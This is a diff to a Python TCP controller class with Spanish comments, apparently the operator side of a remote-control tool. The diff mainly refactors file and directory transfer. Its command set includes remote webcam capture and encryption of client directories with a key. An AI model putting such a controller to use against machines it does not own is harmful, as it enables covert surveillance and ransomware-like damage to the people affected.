@@ -127,58 +127,72 @@ class TCP:
     # Funcion para enviar un archivo
     # ubicacion --> ubicacion del archivo que se quiere enviar
     def enviarArchivo(self, ubicacion):
+        sleep(0.05)
         peso = os.path.getsize(ubicacion)
-        paquetes = int(peso/self.__chunk)
-        if paquetes == 0:
-            paquetes = 1
-        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
+        self.__conexion.send(f"{peso}".encode())
 
-        sleep(0.1)
-        i = 0
-        with open(ubicacion, 'rb') as archivo:
-            info = archivo.read(self.__chunk)
-            while info:
-                self.enviarDatos(info)
+        if peso > 0:
+            paquetes = int(peso/self.__chunk)
+            if paquetes == 0:
+                paquetes = 1
+            print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
+
+            sleep(0.1)
+            i = 0
+            with open(ubicacion, 'rb') as archivo:
                 info = archivo.read(self.__chunk)
-                print(f"Paquete {i} enviado", end='\r')
-                i += 1
-                msg = self.__conexion.recv(8).decode()
-                if msg == "end":
-                    break
-        archivo.close()
+                while info:
+                    self.enviarDatos(info)
+                    info = archivo.read(self.__chunk)
+                    print(f"Paquete {i} enviado", end='\r')
+                    i += 1
+                    msg = self.__conexion.recv(8).decode()
+                    if msg == "end":
+                        break
+            archivo.close()
 
-        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")
+            print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")
+
+        else:
+            print(Fore.YELLOW + f"[!] sft: Archivo \"{ubicacion}\" vacio -- Peso: {peso}")
 
     # Funcion para recibir un archivo
     # ubicacion --> ubicacion en donde se guardara el archivo recibido
     def recibirArchivo(self, ubicacion):
-        paquetes = int(self.__conexion.recv(1024).decode())
-        if paquetes == 0:
-            paquetes = 1
-        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
+        info = self.__conexion.recv(1024).decode().split('-')
+        peso = int(info[0])
+        paquetes = int(info[1])
 
-        i = 0
-        with open(ubicacion, 'wb') as archivo:
-            while True:
-                info = self.recibirDatos()
-                archivo.write(info)
+        if peso > 0:
+            if paquetes == 0:
+                paquetes = 1
+            print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
 
-                if len(info) < self.__chunk:
-                    self.__conexion.send("end".encode())
-                    break
-                else:
-                    self.__conexion.send("ok".encode())
-                    print(f"Paquete {i+1} recibido", end='\r')
-                    i += 1
-        archivo.close()
-        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")
+            i = 0
+            with open(ubicacion, 'wb') as archivo:
+                while True:
+                    info = self.recibirDatos()
+                    archivo.write(info)
+
+                    if len(info) < self.__chunk:
+                        self.__conexion.send("end".encode())
+                        break
+                    else:
+                        self.__conexion.send("ok".encode())
+                        print(f"Paquete {i+1} recibido", end='\r')
+                        i += 1
+            archivo.close()
+            print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")
+
+        else:
+            print(Fore.YELLOW + f"[!] sff: Archivo \"{ubicacion}\" vacio -- Peso: {peso}")
 
     # Funcion para enviar archivos de un directorio
     # cmd --> comando ejecutado
     # origen --> ubicacion del directorio que se quiere enviar
     # index --> indice desde el que se quiere iniciar
     def enviarDirectorio(self, cmd, origen, index):
-        # Se crea una lista de archivos
+        # Se calcula el numero de archivos
         archivos = []
         for i in os.listdir(origen):
             archivo = f"{origen}/{i}"
@@ -187,55 +201,42 @@ class TCP:
         tam = len(archivos)
         print(Fore.CYAN + f"[*] Numero de archivos: {tam}")
 
-        # Se enviar el numero de archivos del directorio
         sleep(0.1)
         self.__conexion.send(str(tam).encode())
 
+        # Se comienzan a enviar los archivos
         if index > tam:
             index = 1
         subidos = 0
         while index <= tam:
-            # Se obtiene informacion del archivo en turno
             nombre = self.getNombre(archivos[index-1])
             peso = os.path.getsize(archivos[index-1])
             paquetes = int(peso/self.__chunk)
 
-            # Si el comando tiene la bandera '-a'
-            # se envian archivos automaticamente
-            if re.search("-a[= ]", cmd):
-                print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
-                res = 'S'
-            # Si no, se pregunta si se quiere enviar o no
-            else:
-                if peso > 0:
+            if peso > 0:
+                if re.search("-a[= ]", cmd):
+                    print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
+                    res = 'S'
+                else:
                     print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Subir \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
                     res = input()
-                else:
-                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
-                    res = 'N'
+            else:
+                print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
+                res = 'N'
 
-            # Se condiciona la respuesta
             sleep(0.05)
             if len(res) == 0 or res.upper() == 'S':
-                # Se envia 'S' al cliente
                 self.__conexion.send('S'.encode())
-                sleep(0.05)
-                # Se envia el nombre del archivo
+                sleep(0.02)
                 self.__conexion.send(nombre.encode())
-                # Se envia el archivo con la funcion
-                # 'self.enviarArchivo'
                 self.enviarArchivo(archivos[index-1])
                 subidos += 1
-                # Se espera un mensaje del cliente para seguir
-                # enviando archivos o no
                 msg = self.__conexion.recv(1024).decode()
                 if msg[:6] == "error:":
                     print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
                     break
 
             elif res.lower() == 'q' or res.lower() == "quit":
-                # Si la respuesta es 'q' o 'quit' se envia al
-                # cliente para terminar la transferencia
                 self.__conexion.send("quit".encode())
                 break
 
@@ -252,56 +253,47 @@ class TCP:
     # destino --> Directorio en el que se guardaran los archivos
     # index --> indice desde el que se quiere iniciar
     def recibirDirectorio(self, cmd, destino, index):
-        # Si no existe el directorio destino, se crea
+        # Se recibe el numero de archivos
         if not os.path.isdir(destino):
             os.mkdir(destino)
-        # Se recibe el numero de archivos que se recibiran
         tam = int(self.__conexion.recv(1024).decode())
         print(Fore.CYAN + f"[*] Numero de archivos: {tam}")
 
+        # Se comienzan a recibir los archivos
         if index > tam:
             index = 1
         bajados = 0
         while index <= tam:
-            # Se recibe la informacion del archivo en turno
             info = self.__conexion.recv(1024).decode()
             info = info.split('\n')
             nombre, paquetes, peso = info[:3]
             peso = int(peso)
 
-            # Si el comando tiene la bandera '-a'
-            # se reciben los archivos automaticamente
-            if re.search("-a[= ]", cmd):
-                print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
-                res = 'S'
-            # Si no, se pregunta si se quiere recibir o no
-            else:
-                if peso > 0:
+            if peso > 0:
+                if re.search("-a[= ]", cmd):
+                    print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
+                    res = 'S'
+                else:
                     print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Bajar \"{nombre}\" (-p{paquetes}, -s{peso})?...\n[S/n] ", end='')
                     res = input()
-                else:
-                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
-                    res = 'N'
+            else:
+                print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
+                res = 'N'
 
-            # Se condiciona la respuesta
             if len(res) == 0 or res.upper() == 'S':
                 try:
-                    # Se envia 'S' al cliente
                     self.__conexion.send('S'.encode())
-                    # Se recibe el archivo
                     self.recibirArchivo(f"{destino}/{nombre}")
                     bajados += 1
                     sleep(0.08)
-                    # Se envia un mensaje al cliente para
-                    # seguir recibiendo archivos o no
                     self.__conexion.send("ok".encode())
                 except:
                     self.__conexion.send("error".encode())
+
             elif res.lower() == 'q' or res.lower() == "quit":
-                # Si la respuesta es 'q' o 'quit' se envia al
-                # cliente para terminar la transferencia
                 self.__conexion.send("quit".encode())
                 break
+
             else:
                 self.__conexion.send('N'.encode())
 
@@ -700,7 +692,11 @@ class TCP:
 
         msg = self.__conexion.recv(1024).decode()
         if msg[:6] != "error:":
-            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
+            msg = self.__conexion.recv(1024).decode()
+            if msg[:6] != "error:":
+                print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
+            else:
+                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
         else:
             print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
 
@@ -720,7 +716,7 @@ class TCP:
     # cmd --> comando ingresado
     def save(self, cmd):
         self.__conexion.send(cmd.encode())
-        with open("info.txt", 'w') as archivo:
+        with open(f"{self.initDir}/info.txt", 'w') as archivo:
             while True:
                 info = self.recibirDatos().decode()
                 archivo.write(info)
@@ -734,12 +730,9 @@ class TCP:
     def shell(self):
         try:
             while True:
-                # Se muestra el diseno de la terminal
                 self.terminal()
-                # Se ingresa un comando
                 cmd = input()
 
-                # Si el comando no tiene nada es invalido
                 if cmd == '' or cmd.replace(' ', '') == '':
                     print(Fore.YELLOW + f"[!] Comando invalido")
 
@@ -754,7 +747,7 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'clear', 'cls' o 'clc'
-                # se limpiar la terminal
+                # se limpia la terminal
                 elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "clc":
                     if self.__myOs == "linux" or self.__myOs == "darwin":
                         os.system("clear")
@@ -789,8 +782,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'cd'...
-                # Parametros:
-                # directorio seguido del comando
                 elif cmd.lower()[:2] == "cd":
                     try:
                         # Se manda a llamar a la funcion 'self.cd'
@@ -801,9 +792,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'sff'...
-                # Parametros:
-                # * -o ubicacion del archivo origen del cliente
-                # + -d ubicacion del archivo destino del servidor
                 elif cmd.lower()[:3] == "sff":
                     try:
                         if re.search("-o[= ]", cmd):
@@ -819,8 +807,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'sft'...
-                # * -o ubicacion del archivo origen del servidor
-                # + -d ubicacion del archivo destino del cliente
                 elif cmd.lower()[:3] == "sft":
                     try:
                         if re.search("-o[= ]", cmd):
@@ -835,19 +821,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'img'
-                # Parametros:
-                # *& -i ubicacion de la imagen del cliente
-                # *& -r elige una imagen 'aleatoria'
-                # + -t la escala que se le quiere dar a la imagen
-                # + -90 gira la imagen 90 grados
-                # + -180 gira la imagen 180 grados
-                # + -270 gira la imagen -90 grados
-                # + -x gira la imagen en el eje x
-                # + -y gira la imagen en el eje y
-                # + -g muestra la imagen en escala de grises
-                # + -n muestra la negativa de la imagen
-                # + -m muestra la imagen como espejo
-                # + -c se aplica el algoritmo Canny a la imagen
                 elif cmd.lower()[:3] == "img":
                     try:
                         if re.search("-i[= ]", cmd) or re.search("-r", cmd):
@@ -862,9 +835,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'pic'...
-                # Parametros:
-                # * -c numero de camara
-                # + -s guarda la foto tomada
                 elif cmd.lower()[:3] == "pic":
                     try:
                         if re.search("-c[= ]", cmd):
@@ -880,8 +850,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'cap'...
-                # Parametros:
-                # * -c numero de camada
                 elif cmd.lower()[:3] == "cap":
                     try:
                         if re.search("-c[= ]", cmd):
@@ -897,9 +865,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'sdf'...
-                # Parametros:
-                # * -o ubicacion del directorio origen del cliente
-                # + -d ubicacion del directorio destino del servidor
                 elif cmd.lower()[:3] == "sdf":
                     try:
                         if re.search("-o[= ]", cmd):
@@ -915,9 +880,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'sdt'...
-                # Parametros:
-                # * -o ubicacion del directorio origen del servidor
-                # + -d ubicacion del directorio destino del cliente
                 elif cmd.lower()[:3] == "sdt":
                     try:
                         if re.search("-o[= ]", cmd):
@@ -932,9 +894,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'zip'...
-                # Parametros:
-                # * -o ubicacion del directorio origen del cliente
-                # + -d ubicacion del archivo destino del cliente
                 elif cmd.lower()[:3] == "zip":
                     try:
                         if re.search("-o[= ]", cmd):
@@ -949,9 +908,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'unzip'...
-                # Parametros:
-                # * -o ubicacion del archivo origen del cliente
-                # + -d ubicacion del directorio destino del cliente
                 elif cmd.lower()[:5] == "unzip":
                     try:
                         if re.search("-o[= ]", cmd):
@@ -967,9 +923,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'encrypt'...
-                # Parametros:
-                # * -k ubicacion de la clave de encriptacion
-                # * -e ubicacion del directorio a encriptar
                 elif cmd.lower()[:7] == "encrypt":
                     try:
                         if re.search("-k[= ]", cmd):
@@ -988,9 +941,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'decrypt'...
-                # Parametros:
-                # * -k ubicacion de la clave de encriptacion
-                # * -d ubicacion del directorio a desencriptar
                 elif cmd.lower()[:7] == "decrypt":
                     try:
                         if re.search("-d[= ]", cmd):
@@ -1010,9 +960,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'miwget'...
-                # Parametros:
-                # * -u url del archivo
-                # + -n nombre de como se quiere guardar el archivo
                 elif cmd.lower()[:6] == "miwget":
                     try:
                         if re.search("-u[= ]", cmd):
@@ -1027,11 +974,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'lendir'...
-                # Parametros:
-                # * -p path del directorio
-                # + -f contar solo los archivos
-                # + -d contar solo los directorios
-                # + -a contar todos los elementos (opcion por default)
                 elif cmd.lower()[:6] == "lendir":
                     try:
                         if re.search("-p", cmd):
@@ -1047,7 +989,6 @@ class TCP:
                         print(e)
 
                 # Si el comando es 'save'...
-                # No tiene parametros
                 elif cmd.lower()[:4] == "save":
                     try:
                         # Se manda a llamar a la funcion
@@ -1071,9 +1012,10 @@ class TCP:
                             if len(info) < self.__chunk:
                                 break
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error al ejecutar el comando")
+                        print(e)
 
         except Exception as e:
-            print(e)
             print(Fore.RED + "Excepcion en el programa principal")
+            print(e)
